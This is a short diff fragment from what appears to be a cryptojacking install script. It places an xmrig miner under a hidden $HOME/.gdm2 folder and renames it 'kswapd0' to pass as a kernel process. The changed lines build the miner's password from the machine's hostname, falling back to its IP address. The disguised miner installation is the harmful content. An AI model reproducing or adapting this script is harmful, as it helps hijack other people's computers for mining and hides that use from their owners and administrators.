@@ -234,7 +234,8 @@ echo "[*] Miner $HOME/.gdm2/xmrig is OK"
 
 mv $HOME/.gdm2/xmrig $HOME/.gdm2/kswapd0
 
-PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+PASS=`hostname`
 if [ "$PASS" == "localhost" ]; then
   PASS=`ip route get 1 | awk '{print $NF;exit}'`
 fi
